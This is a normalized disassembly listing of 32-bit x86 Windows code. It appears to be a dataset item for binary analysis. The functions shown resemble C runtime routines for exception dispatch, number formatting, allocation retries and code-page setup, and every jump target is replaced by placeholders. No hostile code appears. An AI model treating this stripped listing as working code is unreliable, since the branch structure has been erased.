mov [ ebp + 0x10 ] 0x0
call sub_10015b92
mov eax [ ebp - 0x1c ]
call sub_100189c9
retn
sub_10015b05
mov esp [ ebp - 0x18 ]
call sub_10017c1c
and [ eax + 0x20c ] 0x0
mov esi [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
cmp [ esi + 0x4 ] 0x80
jg r-xdata
mov ecx [ edi + 0x8 ]
movsx ecx [ edi + 0x8 ]
jmp r-xdata
push ecx
push esi
push 0x0
push edi
call sub_100157f1
add esp 0x10
and [ ebp - 0x1c ] 0x0
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp + 0x10 ] 0x0
call sub_10015b92
mov eax [ ebp - 0x1c ]
call sub_100189c9
retn
imul eax eax 0x14
add eax ebx
mov edx [ eax + 0x4 ]
cmp ecx edx
jle r-xdata
mov ebx [ esi + 0x10 ]
and [ ebp - 0x20 ] 0x0
inc [ ebp - 0x20 ]
jmp r-xdata
cmp ecx [ eax + 0x8 ]
jg r-xdata
mov eax [ ebp - 0x20 ]
cmp eax [ esi + 0xc ]
jae r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ eax + edx * 8 + 0x8 ]
sub_10015b92
mov eax [ ebp - 0x24 ]
mov [ edi - 0x4 ] eax
push [ ebp - 0x28 ]
call sub_10014161
pop ecx
call sub_10017c1c
mov ecx [ ebp - 0x2c ]
mov [ eax + 0x88 ] ecx
call sub_10017c1c
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x8c ] ecx
cmp [ esi ] 0xe06d7363
jne r-xdata
retn
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x19930520
je r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
push [ esi + 0x18 ]
call sub_1001413a
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
call sub_10015917
pop ecx
pop ecx
sub_10015c08
push 0xc
push r--data
call sub_10018984
xor edx edx
mov [ ebp - 0x1c ] edx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp ecx edx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] dl
je r-xdata
mov ecx [ eax + 0x8 ]
cmp ecx edx
jne r-xdata
mov eax [ eax ]
mov esi [ ebp + 0xc ]
test eax eax
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] edx
xor ebx ebx
inc ebx
push ebx
test al 0x8
je r-xdata
lea esi [ ecx + esi + 0xc ]
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ edi ] bl
je r-xdata
mov edi [ ebp + 0x8 ]
push [ edi + 0x18 ]
call sub_1001eed0
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ edi + 0x18 ] edx
jne r-xdata
call sub_1001eed0
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1001d399
push ebx
push esi
call sub_1001eed0
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1001eed0
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_1001eed0
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_1001eed0
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ edi + 0x18 ]
mov [ esi ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x8
push ecx
push ebx
push esi
call sub_1001eed0
pop ecx
pop ecx
test eax eax
je r-xdata
push ebx
push esi
call sub_1001eed0
pop ecx
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push esi
call sub_10017580
add esp 0xc
cmp [ edi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push [ edi + 0x18 ]
call sub_1001eed0
pop ecx
test eax eax
je r-xdata
push [ edi + 0x14 ]
add edi 0x8
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_1001596c
pop ecx
pop ecx
push eax
push esi
call sub_10017580
add esp 0xc
jmp r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
call sub_100189c9
retn
test [ edi ] 0x4
push 0x0
pop eax
setne al
inc eax
mov [ ebp - 0x1c ] eax
jmp r-xdata
add edi 0x8
push edi
jmp r-xdata
push eax
call sub_1001596c
pop ecx
pop ecx
mov [ esi ] eax
jmp r-xdata
sub_10015d87
push 0x8
push r--data
call sub_10018984
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1001596c
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_10013e5f
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_10015c08
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100189c9
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1001596c
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_10013e5f
jmp r-xdata
sub_10015e19
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_10015d87
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_10013e2d
call sub_10013e66
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_100157f1
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_10015a6c
add esp 0x28
test eax eax
je r-xdata
sub_10015e87
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_10017c1c
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_10017c1c
lea edi [ eax + 0x80 ]
call sub_100179c7
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_10014099
mov edi eax
mov eax [ ebp - 0x4 ]
add esp 0x14
cmp eax [ ebp - 0x8 ]
jae r-xdata
call sub_1001d399
cmp [ esi ] 0xe0434f4d
je r-xdata
pop edi
push ebx
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10013f23
add esp 0x1c
test eax eax
jne r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x14
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp esi [ edi + 0x4 ]
jg r-xdata
cmp esi [ edi ]
jl r-xdata
pop ebx
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
lea ebx [ eax - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10015e19
mov esi [ ebp + 0x1c ]
add esp 0x1c
sub_10015f7b
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
cmp eax 0x80
push esi
push edi
mov [ ebp - 0x1 ] 0x0
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_1001d399
cmp ecx eax
jl r-xdata
cmp ecx 0xffffffff
mov [ ebp - 0x8 ] ecx
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_10017c1c
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_1001d399
call sub_1001d34d
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10015e87
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_10017c1c
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_10017c1c
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_10017c1c
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_1001eed0
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_10014099
add esp 0x14
mov edi eax
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_1001d399
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_10015917
pop ecx
pop ecx
mov edi [ ebp + 0x18 ]
mov eax [ ebp - 0x8 ]
cmp [ edi ] eax
jg r-xdata
call sub_10017c1c
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
add edi 0x14
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
call sub_10017c1c
mov edi [ eax + 0x94 ]
call sub_10017c1c
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_100159a8
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov eax [ edi + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_100159a8
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_10010c5b
test al al
jne r-xdata
call sub_1001d399
cmp eax 0x19930522
jne r-xdata
call sub_10017c1c
call sub_10017c1c
call sub_10017c1c
mov [ eax + 0x88 ] esi
call sub_10017c1c
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
call sub_10015749
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_10015917
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x2c ]
call sub_100156f9
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_10013de1
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov ebx [ ebp - 0xc ]
push [ ebp + 0x20 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_10015e19
mov esi [ ebp + 0x8 ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_10013e66
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_100157f1
add esp 0x10
push [ esi + 0x1c ]
call sub_10015a23
sub_100162df
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_10017c1c
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_10015f7b
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_100157f1
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_100163c5
push 0xc
push r--data
call sub_10018984
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov ebx [ ebp + 0x8 ]
cmp ebx esi
setne al
cmp eax esi
jne r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
cmp edi esi
setne al
cmp eax esi
je r-xdata
call sub_100167f3
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_10010b6c
add esp 0x14
xor eax eax
cmp [ edi ] si
setne al
cmp eax esi
je r-xdata
call sub_100189c9
retn
call sub_1001c01a
mov [ ebp + 0x8 ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x4 ] esi
cmp [ ebx ] si
jne r-xdata
call sub_100167f3
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push edi
push ebx
call sub_1001eee2
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10016481
mov eax [ ebp - 0x1c ]
call sub_100167f3
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_1001c154
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_1001648b
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_100167f3
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10010b6c
add esp 0x14
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_100167f3
push 0x16
pop esi
pop ebx
leave
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_100167f3
push 0x22
jmp r-xdata
pop edi
mov [ ebp - 0x4 ] ebx
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10010b6c
add esp 0x14
mov eax esi
jmp r-xdata
mov edi ecx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x8 ]
jb r-xdata
mov edx [ ebp + 0x8 ]
cmp [ ebp - 0x4 ] edx
jb r-xdata
mov [ ecx ] dl
inc ecx
inc [ ebp - 0x4 ]
xor ebx ebx
cmp eax ebx
jbe r-xdata
mov [ ecx ] bl
dec ecx
mov [ esi ] bl
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_10016568
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jge r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_1001648b
pop ebp
retn
sub_10016592
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
cmp edi ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
call sub_100167f3
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] ebx
mov [ edi ] bl
setne al
inc eax
cmp [ ebp + 0x10 ] eax
ja r-xdata
pop esi
pop ebx
leave
retn 0x14
mov eax [ ebp + 0x14 ]
add eax 0xfffffffe
cmp eax 0x22
ja r-xdata
call sub_100167f3
push 0x22
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] ebx
mov esi edi
cmp [ ebp + 0x18 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
mov [ ebp + 0x18 ] esi
mov [ ebp + 0xc ] ebx
neg edx
adc eax ebx
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add cl 0x30
add cl 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
test edx edx
jbe r-xdata
mov [ esi ] cl
mov ecx [ ebp - 0x4 ]
inc esi
inc ecx
mov [ ebp - 0x4 ] ecx
test eax eax
ja r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push eax
push edx
call sub_1001f1f0
mov [ ebp - 0x8 ] ebx
mov ebx edx
mov edx eax
mov eax ebx
cmp ecx 0x9
jbe r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ esi ] 0x0
dec esi
mov [ edi ] 0x0
call sub_100167f3
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
mov [ ebp + 0x18 ] eax
cmp eax esi
jb r-xdata
xor eax eax
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10010b6c
add esp 0x14
mov eax esi
jmp r-xdata
sub_1001668a
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10016592
pop edi
pop ebp
retn
sub_100166a9
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_1001338e
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_100166ee
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001f285
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_1001673a
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001f3a3
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_100167b1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_10016819
mov edi edi
push ebp
mov ebp esp
push esi
call sub_10016806
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_100167b1
pop ecx
mov esi eax
call sub_100167f3
mov [ eax ] esi
pop esi
pop ebp
retn
sub_1001683c
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
lea edi [ esi + 0xc0 ]
mov eax [ edi ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ edi ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_100166a9
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_100166ee
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_100166ee
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_100166ee
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_100166ee
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_10018de6
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_10011c31
push [ ebp - 0x1c ]
call sub_10011c31
push [ ebp - 0x20 ]
call sub_10011c31
push [ ebp - 0x28 ]
call sub_10011c31
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_10011c31
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10010789
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
cmp eax 0x1
mov [ ebp - 0x30 ] eax
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_1001ed8a
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_10017034
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_10017034
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_10017080
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_10017080
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_10017080
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
inc eax
inc eax
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
